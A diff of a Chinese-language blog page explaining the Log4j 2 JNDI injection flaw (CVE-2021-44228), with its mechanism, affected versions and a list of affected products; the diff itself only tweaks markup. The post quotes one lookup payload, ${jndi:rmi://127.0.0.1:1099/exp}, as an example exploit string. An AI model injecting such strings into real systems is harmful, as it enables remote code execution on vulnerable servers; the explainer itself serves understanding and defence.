@@ -33,6 +33,7 @@
 
   
 
+<link rel="alternate" href="/atom.xml" title="Shmily-ing" type="application/atom+xml">
 </head>
 
 </html>
@@ -103,7 +104,7 @@
        
   <h1 id="Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）"><a href="#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）" class="headerlink" title="Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）"></a>Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就<code>Java的日志记录工具</code>。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
 <p>log4j2中存在<code>JNDI注入漏洞</code>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上<code>执行任意代码</code>。</p>
-<span id="more"></span>
+<a id="more"></a>
 
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>攻击者可以通过 log4j 的 lookup 替换功能向其配置文件的任意位置注入代码（类似 SQL 注入，把 变量替换为{实际代码}），再加上这些版本中用到的 JNDI 特性并没有为 LDAP 提供足够的保护，使得注入的任意代码都能被执行。</p>
 <p>先说下利用exp：${jndi:rmi://127.0.0.1:1099/exp}   (rmi/ldap ，两者部分功能类似，但也有不同点)      再直白点来说就是 用户提交的${jndi:rmi://127.0.0.1:1099/exp} ，被日志捕获到，然后如果log4j2 又开启了 Jndi Lookup功能，就能解析用户提交的exp，发送rmi请求，远程调用一些反序类化的方法。</p>
@@ -112,7 +113,7 @@
 
 
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>  Apache Log4j 2.x &lt; 2.15.0-rc2</li>
+<li>Apache Log4j 2.x &lt; 2.15.0-rc2</li>
 <li><strong>供应链影响范围</strong></li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line"></span><br><span class="line">Apache Struts2</span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line"></span><br><span class="line">Dubbo</span><br><span class="line"></span><br><span class="line">Redis</span><br><span class="line"></span><br><span class="line">Logstash</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br><span class="line">Apache Flink</span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line"></span><br><span class="line">ElasticSearch</span><br><span class="line"></span><br><span class="line">Flume</span><br><span class="line"></span><br><span class="line">等</span><br></pre></td></tr></table></figure>
